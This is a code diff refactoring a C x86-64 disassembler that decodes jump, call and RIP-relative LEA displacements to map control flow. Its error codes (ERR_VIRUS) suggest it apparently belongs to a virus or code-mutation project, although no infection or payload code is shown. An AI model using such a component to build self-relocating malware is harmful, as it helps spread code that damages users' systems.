@@ -6,9 +6,9 @@
 
 /*
 Jc(onditionnal)c(ode) notes:
-	- The terms “less” and “greater” are used for comparisons of signed integers.
-	- The terms “above” and “below” are used for unsigned integers.
-	- REX is used by default with Jcc.
+** - The terms “less” and “greater” are used for comparisons of signed integers.
+** - The terms “above” and “below” are used for unsigned integers.
+** - REX is used by default with Jcc.
 */
 
 /*
@@ -20,24 +20,26 @@ static bool	disasm_instruction(void **value_addr,
 			const void *code, size_t codelen)
 {
 	const uint8_t	*p = code;
-	uint8_t		prefix = 0;              // prefix(es)
+	uint8_t		prefix = 0;
 	uint8_t		opcode;
 
 	*value_addr = NULL;
 	*value_length = 0;
 	*value = 0;
 
-	// prefix loop
 next_opcode:
 
 	if (!codelen--)
-		return false;
+		goto end;
+
 	opcode = *p++;
 
 	// REX prefixes
-	if (opcode >= 0x40 && opcode <= 0x4f) {goto next_opcode;}
+	if (opcode >= 0x40 && opcode <= 0x4f)
+		{goto next_opcode;}
 	// mandatory prefix for two-byte opcode
-	else if (opcode == 0x0f) {prefix |= OP_PREFIX_0F; goto next_opcode;}
+	else if (opcode == 0x0f)
+		{prefix |= OP_PREFIX_0F; goto next_opcode;}
 
 	// rel8
 	if ((opcode >= 0x70 && opcode <= 0x7f)           // JMPcc
@@ -60,7 +62,9 @@ next_opcode:
 	// [rip + displacement]
 	else if (opcode == 0x8d)                           // LEA
 	{
-		if (!codelen--) return false;
+		if (!codelen--)
+			goto end;
+
 		opcode = *p++;
 
 		uint8_t	mod = (opcode & 0b11000000) >> 6;
@@ -73,6 +77,7 @@ next_opcode:
 			*value_length = DWORD;
 		}
 	}
+end:
 	return (*value_addr && *value_length);
 }
 
@@ -88,7 +93,7 @@ size_t		disasm_jumps(struct control_flow *buf, size_t buflen,
 		instruction_length = disasm_length(p_code, codelen);
 
 		if (instruction_length == 0)
-			return errors(ERR_THROW, _ERR_T_DISASM_JUMPS);
+			return errors(ERR_THROW, _ERR_NO, _ERR_T_DISASM_JUMPS);
 
 		if (disasm_instruction(&p_buf->value_addr, &p_buf->value_length, &p_buf->value,
 			p_code, codelen))
@@ -96,16 +101,16 @@ size_t		disasm_jumps(struct control_flow *buf, size_t buflen,
 			p_buf->addr       = p_code;
 			p_buf->length     = instruction_length;
 			p_buf->label_addr = p_buf->addr + instruction_length + p_buf->value;
-			p_buf  += 1;
-			buflen -= 1;
+			p_buf++;
+			buflen--;
 		}
-		p_code  += instruction_length;
+		p_code   += instruction_length;
 		codelen -= instruction_length;
 	}
 
 	// if bufflen reached 0 but not codelen, MAX_JUMPS is too small
-	if (codelen != 0) return errors(ERR_VIRUS, _ERR_V_MAX_JUMP_TOO_SMALL);
+	if (codelen != 0) return errors(ERR_VIRUS, _ERR_V_MAX_JUMP_REACHED, _ERR_T_DISASM_JUMPS);
 
 	// number of control flow instructions successfully disassembled
-	return p_buf - buf;
+	return (p_buf - buf);
 }
